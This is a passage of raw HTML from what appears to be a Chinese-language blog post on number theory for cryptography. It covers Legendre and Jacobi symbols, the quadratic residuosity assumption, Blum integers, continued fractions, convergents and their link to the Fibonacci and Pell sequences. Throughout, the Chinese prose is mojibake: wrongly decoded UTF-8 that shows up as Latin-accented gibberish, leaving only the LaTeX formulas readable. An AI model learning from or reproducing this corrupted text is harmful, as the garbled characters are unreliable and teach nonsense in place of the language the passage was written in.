style="text-align:center">$2ä¸ª$</td></tr><tr><td style="text-align:center">$n$</td><td style="text-align:center">$\phi(n)/2^m(é›†åˆå¤§å°çš„1/2^m)$</td><td style="text-align:center">$2^mä¸ª$</td></tr></tbody></table></div><p>æ±‚äºŒæ¬¡å‰©ä½™çš„å¹³æ–¹æ ¹</p><div class="table-container"><table><thead><tr><th style="text-align:center">æ¨¡æ•°</th><th style="text-align:center">ä¸»è¦ç®—æ³•</th></tr></thead><tbody><tr><td style="text-align:center">$p$</td><td style="text-align:center">Tonelli-Shanks</td></tr><tr><td style="text-align:center">$p^k$</td><td style="text-align:center">Hensel lifting</td></tr><tr><td style="text-align:center">$n$</td><td style="text-align:center">å·²çŸ¥å› å­åˆ†è§£ï¼šä¸­å›½å‰©ä½™æ˜ å°„/å®šç†ï¼›æœªçŸ¥å› å­ï¼šé«˜æ•ˆç®—æ³•æœªçŸ¥</td></tr></tbody></table></div><hr><h2 id="å‹’è®©å¾·ç¬¦å·"><a href="#å‹’è®©å¾·ç¬¦å·" class="headerlink" title="å‹’è®©å¾·ç¬¦å·"></a>å‹’è®©å¾·ç¬¦å·</h2><p><strong>å®šä¹‰</strong>ï¼š$è®¾pæ˜¯å¥‡ç´ æ•°ï¼Œæ•´æ•°aæ»¡è¶³gcd(a,p)=1,åˆ™å‹’è®©å¾·ç¬¦å·å®šä¹‰ä¸ºï¼š$</p><script type="math/tex; mode=display">(\frac {a}{p}):=\begin{cases}1,&{a\in (Z_p^*)^2}\\[4ex]{-1},&{a\in (Z_p^*)\setminus(Z_p^*)^2}\end{cases}</script><p>$ä¸”å¦‚æœp\mid a,åˆ™ä»¤(\frac {a}{p})=0$</p><p>æ€§è´¨:$è®¾pæ˜¯å¥‡ç´ æ•°ï¼Œa,b\in Z,åˆ™æœ‰$</p><ul><li><p>$1.\ (\frac {a}{p})\equiv a^{\frac{p-1}2}\pmod pï¼›ç‰¹åˆ«åœ°ï¼Œ(\frac {-1}{p})= (-1)^{\frac{p-1}2}$</p></li><li><p>$2.\ (\frac {a}{p})(\frac {b}{p})=(\frac {ab}{p})$</p></li><li><p>$3.\ a\equiv b\pmod p \Rightarrow (\frac {a}{p})=(\frac {b}{p})$</p></li><li><p>$4.\ (\frac {2}{p})=(-1)^{\frac{p^2-1}{8}}\ \ \ \ \ \ 2\in(Z_p^*)^2\iff p\equiv \pm 1\pmod 8$</p></li><li><p>$5.\ äºŒæ¬¡äº’åå¾‹(ä½¿ç”¨å‰è¦æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¨¡4ä½™1)ï¼šè®¾pã€qæ˜¯å¥‡ç´ æ•°ï¼Œåˆ™æœ‰(\frac {p}{q})=(-1)^{ {\frac{p-1}2}{\frac{q-1}2} }(\frac {q}{p})$</p><p>$è‹¥p\equiv 1\pmod 4\ or\ q\equiv 1\pmod 4\iff (\frac {p}{q})=(\frac {q}{p}),åä¹‹åˆ™(\frac {p}{q})=-(\frac {q}{p})$</p></li></ul><hr><h2 id="é›…å¯æ¯”ç¬¦å·"><a href="#é›…å¯æ¯”ç¬¦å·" class="headerlink" title="é›…å¯æ¯”ç¬¦å·"></a>é›…å¯æ¯”ç¬¦å·</h2><p><strong>å®šä¹‰</strong>ï¼š$è®¾aæ˜¯æ•´æ•°ï¼Œnæ˜¯æ­£æ•´æ•°ï¼Œn=p_1\dots p_tï¼Œå…¶ä¸­p_iéƒ½æ˜¯å¥‡ç´ æ•°(å½¼æ­¤å¯ä»¥ç›¸ç­‰)ï¼Œåˆ™é›…å¯æ¯”ç¬¦å·å®šä¹‰ä¸ºï¼š$</p><p>$(\frac {a}{n})=(\frac {a}{p_1})\dots (\frac {a}{p_t})\ ä¸”ä»¤(\frac {a}{1})=1$</p><p>$gcd(a,n)&gt;1\iff (\frac{a}{n})=0$</p><p><strong>æ€§è´¨</strong>:$è®¾må’Œnæ˜¯æ­£å¥‡æ•°ï¼Œa,b\in \mathbb{Z},åˆ™æœ‰$</p><ul><li><p>$1.\ \ (\frac {-1}{n})\equiv {(-1)}^{\frac{n-1}2}$</p></li><li><p>$2.\ (\frac {a}{n})(\frac {b}{n})=(\frac {ab}{n})$</p></li><li><p>$3.\ a\equiv b\pmod n \Rightarrow (\frac {a}{n})=(\frac {b}{n})$</p></li><li><p>$4.\ (\frac {2}{n})=(-1)^{\frac{n^2-1}{8}}$</p></li><li><p>$5.\ (\frac {a}{mn})=(\frac {a}{m})(\frac {a}{n})$</p></li><li><p>äºŒæ¬¡äº’åå¾‹çš„æ¨å¹¿ï¼š</p><p>$(\frac {m}{n})={(-1)}^{ {\frac{m-1}2}{\frac{n-1}2} }(\frac {n}{m})$</p><p>$è‹¥m\equiv 1\pmod 4\ or\ n\equiv 1\pmod 4\iff (\frac {m}{n})=(\frac {n}{m}),åä¹‹åˆ™(\frac {m}{n})=-(\frac {n}{m})$</p></li><li><p>èƒ½å¦åˆ¤æ–­äºŒæ¬¡å‰©ä½™ï¼Ÿ</p><blockquote><p>$(\frac{a}{n})=0æˆ–-1\Rightarrow a\notin (Z_n^*)^2$</p><p>$(\frac{a}{n})=1\Rightarrow æ— æ³•åˆ¤æ–­$</p><p>$a\in (Z_n^*)^2\Rightarrow (\frac{a}{n})=1$</p></blockquote></li></ul><hr><h2 id="é›…å¯æ¯”æ˜ å°„-Jacobi-map"><a href="#é›…å¯æ¯”æ˜ å°„-Jacobi-map" class="headerlink" title="é›…å¯æ¯”æ˜ å°„(Jacobi map)"></a>é›…å¯æ¯”æ˜ å°„(Jacobi map)</h2><p>$J_n:Z_n^*\rightarrow{\pm1}$</p><p>$a\in Z_n^*\rightarrow (\frac{a}{n})=\pm1$</p><p>$é›…å¯æ¯”æ˜ å°„çš„æ ¸ï¼šKer\ J_nï¼šZ_n^*ä¸­æ˜ å°„åˆ°1çš„éƒ¨åˆ†å½¢æˆçš„ä¸€ä¸ªå­é›†$</p><h3 id="äºŒæ¬¡å‰©ä½™æ€§å‡è®¾-QRå‡è®¾-Quadratic-residuosity-assumption"><a href="#äºŒæ¬¡å‰©ä½™æ€§å‡è®¾-QRå‡è®¾-Quadratic-residuosity-assumption" class="headerlink" title="äºŒæ¬¡å‰©ä½™æ€§å‡è®¾(QRå‡è®¾,Quadratic residuosity assumption)"></a>äºŒæ¬¡å‰©ä½™æ€§å‡è®¾(QRå‡è®¾,Quadratic residuosity assumption)</h3><script type="math/tex; mode=display">è®¾n=pqï¼Œå…¶ä¸­på’Œqæ˜¯ä¸åŒçš„ç´ æ•°ï¼Œ\\åœ¨ä¸çŸ¥é“på’Œqçš„æƒ…å†µä¸‹ï¼Œ\\ç»™å®š\mathbb{Z_n^*}ä¸­çš„å…¶ä¸­ä¸€ä¸ªæ•´æ•°ï¼Œ(ä»\mathbb{Ker\ J_n}é‡Œéšæœºé€‰æ‹©ä¸€ä¸ªæ•´æ•°ï¼‰\\å°†éš¾ä»¥åˆ¤æ–­ä»–æ˜¯ä¸æ˜¯äºŒæ¬¡å‰©ä½™(éš¾ä»¥åŒºåˆ†äºŒæ¬¡å‰©ä½™å’ŒäºŒæ¬¡éå‰©ä½™,\\å³éš¾ä»¥åŒºåˆ†å®ƒå±äº\mathbb{(Z_n^*)^2}è¿˜æ˜¯\mathbb{Ker\ J_n\setminus (Z_n^*)^2}ã€‚</script><p>$(\frac{a}{n})=-1\Rightarrow aæ˜¯æ¨¡nä¸‹äºŒæ¬¡éå‰©ä½™$</p><p>$(\frac{a}{n})=1æ—¶,(\frac{a}{p})ã€(\frac{a}{q})å¯èƒ½åŒä¸º1æˆ–-1ï¼Œä»…å‰è€…æ‰æ˜¯äºŒæ¬¡å‰©ä½™$</p><hr><h2 id="åŠç´ æ•°ï¼ˆsemi-primeï¼‰"><a href="#åŠç´ æ•°ï¼ˆsemi-primeï¼‰" class="headerlink" title="åŠç´ æ•°ï¼ˆsemi-primeï¼‰"></a>åŠç´ æ•°ï¼ˆsemi-primeï¼‰</h2><p><strong>å®šä¹‰</strong>ï¼šåˆç§°â€œäºŒç´ æ•°â€ï¼ˆbiprimeï¼‰ï¼Œåˆ™$n$æ˜¯åŠç´ æ•°ï¼Œåˆ™$n=pq$ ,$p$å’Œ$q$<br>éƒ½æ˜¯$n$çš„ç´ å› å­ ($p$å’Œ$q$å¯ä»¥ç›¸åŒ)ã€‚æ¯”å¦‚ï¼š4,6,9,10,$\cdots$</p><p>Blumæ•´æ•°æ˜¯ä¸€ç§åŠç´ æ•°ğŸ‘‡</p><h3 id="Blumæ•´æ•°"><a href="#Blumæ•´æ•°" class="headerlink" title="Blumæ•´æ•°"></a>Blumæ•´æ•°</h3><p><strong>å®šä¹‰</strong>ï¼š$næ˜¯Blumæ•´æ•°ï¼Œåˆ™n=pqï¼Œp\equiv q\equiv 3\pmod 4$æ˜¯ä¸¤ä¸ªä¸åŒçš„ç´ å› å­ã€‚</p><p><strong>æ€§è´¨</strong>ï¼šè®¾næ˜¯Blumæ•´æ•°</p><ul><li><p>1.<script type="math/tex">(\frac{-1}{p})=(\frac{-1}{q})=-1\\(\frac{-1}{n})=(\frac{-1}{p})(\frac{-1}{q})=(-1)(-1)=1</script></p></li><li><p>2.<script type="math/tex">å¯¹äºä»»æ„  a \in Z_{n}^{*},\left(\frac{a}{n}\right)=1 \Rightarrow a \in\left(Z_{n}^{*}\right)^{2}  æˆ–  -a \in\left(Z_{n}^{*}\right)^{2}</script></p><blockquote><p>$\left(\frac{a}{n}\right)=\left(\frac{a}{p}\right)\left(\frac{a}{q}\right)=1 \Rightarrow\left(\frac{a}{p}\right)=\left(\frac{a}{q}\right)=1  æˆ–  \left(\frac{a}{p}\right)=\left(\frac{a}{q}\right)=-1 $</p><p>$\left(\frac{a}{p}\right)=\left(\frac{a}{q}\right)=1 \Rightarrow a \in\left(Z_{n}^{*}\right)^{2}æ—¶ï¼š$</p><script type="math/tex; mode=display">\left(\frac{-a}{p}\right)=\left(\frac{-1}{p}\right)\left(\frac{a}{p}\right)=-1 \times 1=-1 , åŒç†,  \left(\frac{-a}{q}\right)=-1 \Rightarrow-a \in Z_{n}^{*} \backslash\left(Z_{n}^{*}\right)^{2}</script><p>$\left(\frac{a}{p}\right)=\left(\frac{a}{q}\right)=-1æ—¶åŒç†å¯å¾—-a \in\left(Z_{n}^{*}\right)^{2}$</p></blockquote></li><li><p>3.å¯¹äºä»»æ„$a\in(Z_n^*)^2$,è®¾å®ƒçš„å››ä¸ªå¹³æ–¹æ ¹ä¸º$\pm b$å’Œ åœŸ$b^\prime$,åˆ™</p></li></ul><p>  $\left(\frac bp\right)=\left(\frac bq\right)=1$,å³$b\in(Z_n^*)^2$</p><p>  $\left(\frac{-b}p\right)=\left(\frac{-b}q\right)=-1$</p><p>  $\left(\frac{b^{\prime}}p\right)=1,\left(\frac{b^{\prime}}q\right)=-1$<br>  $\left(\frac{-b^{\prime}}p\right)=-1,\:\left(\frac{-b^{\prime}}q\right)=1$</p><ul><li><p>4.å‡½æ•°$f(x)=x^2mod$ $n$æ˜¯å®šä¹‰åœ¨$(Z_n^*)^2$ä¸Šçš„ç½®æ¢ã€‚</p><script type="math/tex; mode=display">x\in(Z_n^*)^2\Rightarrow f(x)=x^2\:mod\:n\in(Z_n^*)^2</script><script type="math/tex; mode=display">f(x)=y\in(Z_n^*)^2\Rightarrow$æœ‰å”¯ä¸€çš„å¹³æ–¹æ ¹ $x\in(Z_n^*)^2</script></li><li><p>5.è®¾$a\in(Z_n^*)^2$,é›…å¯æ¯”ç¬¦å·æ˜¯1çš„ä¸¤ä¸ªå¹³æ–¹æ ¹ä¸­åªæœ‰ä¸€ä¸ªå°äº$\frac n2$ (å¦ä¸€ä¸ªå¤§äº$\frac n2)$ã€‚</p><blockquote><p>æš—ç¤ºï¼šé›…å¯æ¯”ç¬¦å·æ˜¯ -1 çš„ä¸¤ä¸ªå¹³æ–¹æ ¹ä¸­åªæœ‰ä¸€ä¸ªçš„å€¼å°äº $\frac n2$ (å¦ä¸€ä¸ªå¤§äº$\frac n2)$<br>å–å€¼å°äº (å¤§äº)$\frac n2$çš„ä¸¤ä¸ªå¹³æ–¹æ ¹çš„é›…å¯æ¯”ç¬¦å·äº’ä¸ºç›¸åæ•°ã€‚</p></blockquote></li></ul><hr><h2 id="è¿åˆ†æ•°ï¼ˆContinued-Fractionï¼‰"><a href="#è¿åˆ†æ•°ï¼ˆContinued-Fractionï¼‰" class="headerlink" title="è¿åˆ†æ•°ï¼ˆContinued Fractionï¼‰"></a>è¿åˆ†æ•°ï¼ˆContinued Fractionï¼‰</h2><h3 id="ç®€å•è¿åˆ†æ•°-Simple-Continued-Fraction"><a href="#ç®€å•è¿åˆ†æ•°-Simple-Continued-Fraction" class="headerlink" title="ç®€å•è¿åˆ†æ•°(Simple Continued Fraction)"></a>ç®€å•è¿åˆ†æ•°(Simple Continued Fraction)</h3><p>$a_0+\frac1{a_1+\frac1{a_2+\frac1{a_3+\frac1{â€¦}}}}$<br>$a_0$å¯ä»¥æ˜¯ä»»æ„æ•´æ•°ï¼Œ$a_i$æ˜¯æ­£æ•´æ•°$(i&gt;0):$éƒ¨åˆ†å•† (partial quotient)<br>$[a_0,a_1,a_2,a_3,â€¦]$</p><blockquote><p>ä¾‹ï¼š$\frac{43}{19}= 2+\frac1{3+\frac1{1+\frac14}}=[2,3,1,4]=[2,[3,1,4]]=2+\frac{1}{[3,1,4]}$</p></blockquote><p>ä»»ä½•å®æ•°éƒ½å¯ä»¥ç”¨è¿åˆ†æ•°çš„å½¢å¼æ¥è¡¨ç¤º</p><p>$\mathbb{Q}=\{\frac ab\mid a,b\in\mathbb{Z},b\neq0\}$</p><h4 id="æœ‰é™è¿åˆ†æ•°-Finite-Continued-Fraction"><a href="#æœ‰é™è¿åˆ†æ•°-Finite-Continued-Fraction" class="headerlink" title="æœ‰é™è¿åˆ†æ•°(Finite Continued Fraction)"></a>æœ‰é™è¿åˆ†æ•°(Finite Continued Fraction)</h4><p>$[a_0,a_1,\dots,a_n]$</p><p><strong>å®šç†</strong>ï¼šä»»ä½•æœ‰ç†æ•°éƒ½å¯ä»¥è¡¨ç¤ºæˆæœ‰é™è¿åˆ†æ•°ï¼›ä»»ä½•<br>æœ‰é™è¿åˆ†æ•°éƒ½æ˜¯ä¸€ä¸ªæœ‰ç†æ•°ã€‚<br>$\frac ab\ \underleftrightarrow{æ¬§å‡ é‡Œå¾—ç®—æ³•}\ [a_0,a_1,â€¦,a_n]$</p><p>$[a_0,a_1,\dots,a_n]=[a_0,a_1,\dots,a_m,[a_{m+1}\dots,a_n]]$</p><p><strong>æœ‰é™è¿åˆ†æ•°è¡¨ç¤ºå€’æ•°</strong></p><p>ç»™å®šæœ‰é™è¿åˆ†æ•°$[a_0,a_1,â€¦,a_n]$,æ±‚å€’æ•°</p><ul><li>å¦‚æœ$a_0=0$,å°±æŠŠ0å»æ‰ï¼š$[a_1,â€¦,a_n]$</li><li>å¦‚æœ$a_0\neq0$,å°±åœ¨å‰é¢è¡¥ä¸Š$0:[0,a_0,â€¦,a_n]$</li></ul><h5 id="æœ‰é™è¿åˆ†æ•°çš„ç­‰ä»·è¡¨ç¤º"><a href="#æœ‰é™è¿åˆ†æ•°çš„ç­‰ä»·è¡¨ç¤º" class="headerlink" title="æœ‰é™è¿åˆ†æ•°çš„ç­‰ä»·è¡¨ç¤º"></a>æœ‰é™è¿åˆ†æ•°çš„ç­‰ä»·è¡¨ç¤º</h5><p> $n&gt; 0$,$a_n=1$æ—¶ï¼Œ$[a_0,a_1,â€¦,1]=[a_0,a_1,â€¦,a_{n-1}+1]$<br>å¦åˆ™ï¼Œ$[a_0,a_1,â€¦,a_n]=[a_0,a_1,â€¦,a_n-1,1]$</p><h5 id="å”¯ä¸€æ€§è¡¨è¾¾"><a href="#å”¯ä¸€æ€§è¡¨è¾¾" class="headerlink" title="å”¯ä¸€æ€§è¡¨è¾¾"></a>å”¯ä¸€æ€§è¡¨è¾¾</h5><p><strong>å®šç†</strong>ï¼šå¦‚æœä¸¤ä¸ªæœ‰é™è¿åˆ†æ•°$[a_0,â€¦,a_n],[b_0,â€¦,b_m]$éƒ½ç­‰äºæœ‰ç†æ•°$x$,å¹¶ä¸”$a_n&gt;1,b_m&gt;1$,é‚£ä¹ˆ$n=m$,è€Œä¸”å®ƒä¿©æ˜¯å®Œå…¨ç›¸åŒçš„ã€‚</p><h4 id="æ— é™è¿åˆ†æ•°-Infinite-Continued-Fraction"><a href="#æ— é™è¿åˆ†æ•°-Infinite-Continued-Fraction" class="headerlink" title="æ— é™è¿åˆ†æ•°(Infinite Continued Fraction)"></a>æ— é™è¿åˆ†æ•°(Infinite Continued Fraction)</h4><p>$[a_0,a_1,\dots]$</p><p>è¡¨ç¤ºæ— ç†æ•°</p><p><strong>å®šç†1ï¼š</strong>å¯¹äºæ— é™è¿åˆ†æ•°$[ a_0, a_1, . . . ]$,     $x_n= [ a_0, a_1, . . . , a_n]$æ˜¯ç¬¬nä¸ªæ¸è¿›åˆ†æ•°ã€‚å¦‚æœ$n\to\infty$,åˆ™$x_n\to x$ , $x\in R$ ã€‚<br>$x=[a_0,a_1,\dots]$</p><p><strong>æ¸è¿›åˆ†æ•°çš„åˆ†æ¯æ»¡è¶³ä»¥ä¸‹æ€§è´¨</strong>ï¼š<br>ç¬¬nä¸ªæ¸è¿›åˆ†æ•°$[a_0,a_1,â€¦,a_n]=x_n=\frac{p_n}{q_n}$ ,<br>åˆ™ $q_n\geq n$ã€‚å¦‚æœ$n&gt;3$,åˆ™ $q_n&gt;n$ã€‚(è¯æ˜ç•¥)</p><p><strong>æ€§è´¨</strong>ï¼š</p><ul><li>ä»»ä½•æ— é™è¿åˆ†æ•°éƒ½å°äºå®ƒçš„ä»»æ„å¥‡æ•°ç¼–å·çš„æ¸è¿›åˆ†æ•°ï¼Œè€Œå¤§äºä»»æ„å¶æ•°ç¼–å·çš„ã€‚(ä¸‰æ˜æ²»ç»“æ„)</li><li>$a_t$æ˜¯ç¬¬$t$ä¸ªå®Œå…¨å•†çš„æ•´æ•°éƒ¨åˆ†ã€‚ç‰¹åˆ«çš„ï¼Œ$a_0$æ˜¯æ— é™è¿åˆ†æ•°çš„æ•´æ•°éƒ¨åˆ†ã€‚</li><li>ä¸¤ä¸ªæ— é™è¿åˆ†æ•°ï¼Œå¦‚æœå®ƒä»¬è¡¨ç¤ºçš„å®æ•°ç›¸åŒã€å®ƒä¿©å°±æ˜¯å®Œå…¨ç›¸åŒçš„ã€‚</li><li>ä»»ä½•æ— ç†æ•°è¡¨ç¤ºæˆæ— é™è¿åˆ†æ•°æ—¶ï¼Œå…¶è¡¨ç¤ºå½¢å¼æ˜¯å”¯ä¸€çš„ã€‚</li></ul><h3 id="æ¸è¿›åˆ†æ•°"><a href="#æ¸è¿›åˆ†æ•°" class="headerlink" title="æ¸è¿›åˆ†æ•°"></a>æ¸è¿›åˆ†æ•°</h3><p><strong>å®šä¹‰</strong>ï¼š$\begin{aligned}\text{ç§° }&amp;[a_0,â€¦,a_m]\left(0\leq m\leq n\right)\text{ä¸º }[a_0,a_1,â€¦,a_n]\text{çš„ç¬¬mä¸ªæ¸è¿›åˆ†æ•°ã€‚}\end{aligned}$</p><p>æ™®éè§„å¾‹ï¼šåŸæœ¬çš„åˆ†æ•°å±…ä¸­ï¼Œå¶æ•°ç¼–å·ä½äºå·¦è¾¹ï¼Œå‘ˆé€’å¢è¶‹åŠ¿ï¼Œå¥‡æ•°ç¼–å·ä½äºå³è¾¹ï¼Œå‘ˆé€’å‡è¶‹åŠ¿ï¼Œä»ä¸¤è¾¹é€æ¸é€¼è¿‘ã€‚</p><p>$[a_0]=\frac{p_0}{q_0}$<br>$[a_0,a_1]=\frac{p_1}{q_1}$<br>$[a_0,a_1,â€¦,a_n]=\frac{p_n}{q_n}$<br>$\frac{p_0}{q_0}&lt;\frac{p_2}{q_2}&lt;\cdots&lt;\frac{p_n}{q_n}&lt;\cdots&lt;\frac{p_3}{q_3}&lt;\frac{p_1}{q_1} $</p><p><strong>è¿­ä»£å…¬å¼</strong></p><p>å†™æˆ$[a_0,â€¦,a_m]=\frac{p_n}{q_n}$<br>åˆ™æœ‰$p_n=a_np_{n-1}+p_{n-2},\quad q_n=a_nq_{n-1}+q_{n-2}\quad(n\geq2)$</p><p><img src="/2024/07/30/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/æ¸è¿›åˆ†æ•°.jpg" alt="æ¸è¿›åˆ†æ•°"></p><h4 id="å®šç†"><a href="#å®šç†" class="headerlink" title="å®šç†"></a>å®šç†</h4><p>$p_n q_{n-1}-p_{n-1} q_n=(-1)^{n-1}$</p><h3 id="å®Œå…¨å•†-Complete-quotient"><a href="#å®Œå…¨å•†-Complete-quotient" class="headerlink" title="å®Œå…¨å•†(Complete quotient)"></a>å®Œå…¨å•†(Complete quotient)</h3><p><strong>å®šä¹‰</strong>ï¼šç§°<script type="math/tex">[a_t,\dots,a_n](0â‰¤t\leq n)ä¸º[a_0,a_1,...,a_n]çš„ç¬¬tä¸ªå®Œå…¨å•†</script></p><p><strong>å®šç†</strong>ï¼š$\text{å®šç†:ç»™å®šæœ‰é™è¿åˆ†æ•° }[a_0,a_1,â€¦,a_n]\text{,æœ‰}$</p><p>$\bullet\text{ å¦‚æœ }a_n=1\text{,åˆ™ }[a_{n-1},a_n]\text{ çš„æ•´æ•°éƒ¨åˆ†æ˜¯ }a_{n-1}+1$</p><p>$\bullet\text{ å¦åˆ™ }[a_t,â€¦,a_n]\text{ (0}\leq t\leq n)\text{ çš„æ•´æ•°éƒ¨åˆ†æ˜¯ }a_t$</p><h3 id="å•è°ƒæ€§ï¼ˆmonotone-propertiesï¼‰"><a href="#å•è°ƒæ€§ï¼ˆmonotone-propertiesï¼‰" class="headerlink" title="å•è°ƒæ€§ï¼ˆmonotone propertiesï¼‰"></a>å•è°ƒæ€§ï¼ˆmonotone propertiesï¼‰</h3><ul><li><p>æ€§è´¨1ï¼šæ‰€æœ‰å¶æ•°ç¼–å·çš„æ¸è¿›åˆ†æ•°æ˜¯ä¸¥æ ¼é€’å¢çš„($\frac{p_0}{q_0}&lt;\frac{p_2}{q_2}&lt;\cdotp\cdotp\cdotp)$,è€Œå¥‡æ•°ç¼–å·çš„åˆ™æ˜¯ä¸¥æ ¼é€’å‡çš„($â€¦&lt;\frac{p_3}{q_3}&lt;\frac{p_1}{q_1}).$</p></li><li><p>æ€§è´¨2ï¼šä»»ä½•å¥‡æ•°ç¼–å·çš„æ¸è¿›åˆ†æ•°å¤§äºå’Œå®ƒç›¸é‚»çš„ä¸¤ä¸ªå¶æ•°ç¼–å·çš„æ¸è¿›åˆ†æ•°ã€‚</p></li><li><p>æ€§è´¨3ï¼š$\frac{p_0}{q_0}&lt;\frac{p_2}{q_2}&lt;\cdots&lt;\frac{p_n}{q_n}&lt;\cdots&lt;\frac{p_3}{q_3}&lt;\frac{p_1}{q_1} $</p><blockquote><p>å¦‚æœ$n$æ˜¯å¶æ•°ï¼Œåˆ™$x_n$æ˜¯å¶æ•°ç¼–å·é‡Œæœ€å¤§çš„æ¸è¿›åˆ†æ•°ï¼Œ<br>ä¸” $x_n$å°äºæ‰€æœ‰å¥‡æ•°ç¼–å·çš„æ¸è¿›åˆ†æ•°ã€‚</p><p>å¦‚æœ$n$æ˜¯å¥‡æ•°ï¼Œåˆ™$x_n$æ˜¯å¥‡æ•°ç¼–å·é‡Œæœ€å°çš„æ¸è¿›åˆ†æ•°ï¼Œ</p><p>ä¸” $x_n$å¤§äºæ‰€æœ‰å¶æ•°ç¼–å·çš„æ¸è¿›åˆ†æ•°ã€‚</p></blockquote></li></ul><h3 id="è¿åˆ†æ•°ç®—æ³•-continued-fraction-algorithm"><a href="#è¿åˆ†æ•°ç®—æ³•-continued-fraction-algorithm" class="headerlink" title="è¿åˆ†æ•°ç®—æ³• (continued fraction algorithm)"></a>è¿åˆ†æ•°ç®—æ³• (continued fraction algorithm)</h3><p>æ¬§å‡ é‡Œå¾—ç®—æ³•åªèƒ½å¤„ç†åˆ†æ•°ï¼Œä¸èƒ½å¤„ç†å°æ•°</p><p>è¾“å…¥ï¼šå®æ•°$x$</p><p>ä»¤$i=0,x_0=x;$</p><ul><li>step1.    ä»¤$a_i$ä¸º $x_i$çš„æ•´æ•°éƒ¨åˆ†ï¼›</li><li>step2.     $b_i=x_i-a_i$</li><li>step3.    $ if\ b_i\neq0$, then $i++,x_i=1/_{b_i}$,$è½¬å»step1$;</li><li>else return $[a_0,a_1,â€¦]$ ;</li></ul><h3 id="å‘¨æœŸè¿åˆ†æ•°-periodic-continued-fraction"><a href="#å‘¨æœŸè¿åˆ†æ•°-periodic-continued-fraction" class="headerlink" title="å‘¨æœŸè¿åˆ†æ•°(periodic continued fraction)"></a>å‘¨æœŸè¿åˆ†æ•°(periodic continued fraction)</h3><p><strong>å®šä¹‰</strong>ï¼šå‘¨æœŸè¿åˆ†æ•°$[a_0,a_1,â€¦]$æ˜¯æ— é™è¿åˆ†æ•°ï¼Œè€Œä¸”å¯¹äºå›ºå®šçš„æ­£æ•´æ•°$k$,ä»¥åŠæ‰€æœ‰çš„$l\geq L$,<br>éƒ½æœ‰$a_l=a_{l+k}$ ,<br>éƒ¨åˆ†å•†$a_L,â€¦,a_{L+k-1}$ç§°ä½œ <strong>å‘¨æœŸ(period)</strong>ã€‚</p><p>å¯ç®€å†™æˆ$\left[a_0,â€¦,a_{L-1},\overline{a_L,â€¦,a_{L+k-1}}\right]$ã€‚</p><blockquote><p>ä¾‹ï¼š$\begin{aligned}&amp;[2,5,1,4,3,6,1,4,3,6,â€¦]\\&amp;=[2,5,\overline{1,4,3,6}]\end{aligned}$</p></blockquote><p>ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹</p><script type="math/tex; mode=display">ax^2+bx+c=0\quad(a,b,c\in\mathbb{Z},\:a\neq0)</script><p>äºŒæ¬¡ä¸å°½æ ¹$: u\pm \sqrt {w}$ $( u, w\in Q)$ ,$\sqrt{w}$ æ˜¯æ— ç†æ•° ($w$ä¸èƒ½å®Œå…¨å¼€æ–¹ï¼‰</p><ul><li><strong>å®šç†(æ¬§æ‹‰)</strong>:å¦‚æœtæ˜¯å‘¨æœŸè¿åˆ†æ•°ï¼Œå®ƒå°±ä¸€å®šæ˜¯äºŒæ¬¡ä¸å°½æ ¹</li><li><strong>å®šç†(æ‹‰æ ¼æœ—æ—¥)</strong>:å¦‚æœtæ˜¯äºŒæ¬¡ä¸å°½æ ¹ï¼Œå®ƒå°±ä¸€å®šæ˜¯å‘¨æœŸè¿åˆ†æ•°</li></ul><blockquote><script type="math/tex; mode=display">\begin{aligned}x^2-2x-1&=0\\x^{2}&=2x+1\\x&=2+\frac1x\\&=2+\frac1{2+\frac1x}\\&=2+\frac{1}{2+{\frac{1}{\dots}}}=[2,2,\dots]=1+\sqrt{2}(ç™½é“¶æ¯”ä¾‹)\end{aligned}</script><script type="math/tex; mode=display">\begin{aligned}x^2-x-1&=0\\x^{2}&=x+1\\x&=1+\frac1x\\&=1+\frac1{1+\frac1x}\\&=1+\frac{1}{1+{\frac{1}{\dots}}}=[1,1,\dots]=\frac{1+\sqrt{5}}2(é»„é‡‘æ¯”ä¾‹)\end{aligned}</script></blockquote><h4 id="å‘¨æœŸè¿åˆ†æ•°ä¸æ•°åˆ—"><a href="#å‘¨æœŸè¿åˆ†æ•°ä¸æ•°åˆ—" class="headerlink" title="å‘¨æœŸè¿åˆ†æ•°ä¸æ•°åˆ—"></a>å‘¨æœŸè¿åˆ†æ•°ä¸æ•°åˆ—</h4><h5 id="æ–æ³¢é‚£å¥‘æ•°åˆ—-1-1-2-3-5-8-13-dots"><a href="#æ–æ³¢é‚£å¥‘æ•°åˆ—-1-1-2-3-5-8-13-dots" class="headerlink" title="æ–æ³¢é‚£å¥‘æ•°åˆ— $1,1,2,3,5,8,13,\dots$"></a><strong>æ–æ³¢é‚£å¥‘æ•°åˆ—</strong> $1,1,2,3,5,8,13,\dots$</h5><p>$F_0=1,\quad F_1=1,$<br>$F_n=F_{n-1}+F_{n-2}=\frac{\phi^n-(-\phi)^{-n}}{\sqrt{5}}\quad(\phi=\frac{1+\sqrt{5}}2)$</p><ul><li><strong>é»„é‡‘æ¯”ä¾‹çš„å‘¨æœŸè¿åˆ†æ•°çš„å„ä¸ªæ¸è¿›åˆ†æ•°æ°å¥½æ˜¯æ–æ³¢é‚£å¥‘æ•°åˆ—ç›¸é‚»ä¸¤é¡¹ç›¸é™¤æ‰€å¾—çš„åˆ†æ•°</strong></li></ul><h5 id="ä½©å°”æ•°åˆ—-0-1-2-5-12-29-70-dots"><a href="#ä½©å°”æ•°åˆ—-0-1-2-5-12-29-70-dots" class="headerlink" title="ä½©å°”æ•°åˆ— $0,1,2,5,12,29,70,\dots$"></a><strong>ä½©å°”æ•°åˆ—</strong> $0,1,2,5,12,29,70,\dots$</h5><p>$P_0=0,P_1=1,$</p><p>$P_n=2P_{n-1}+P_{n-2}=\frac{(1+\sqrt{2})^n-(1-\sqrt{2})^n}{2\sqrt{2}}$</p><ul><li><strong>ç™½é“¶æ¯”ä¾‹çš„å‘¨æœŸè¿åˆ†æ•°çš„å„ä¸ªæ¸è¿›åˆ†æ•°æ°å¥½æ˜¯ä½©å°”æ•°åˆ—ç›¸é‚»ä¸¤é¡¹ç›¸é™¤æ‰€å¾—çš„åˆ†æ•°</strong></li></ul><h3 id="æœ€ä½³è¿‘ä¼¼å€¼-amp-ä¸¢ç•ªå›¾é€¼è¿‘-Diophantine-approximation"><a 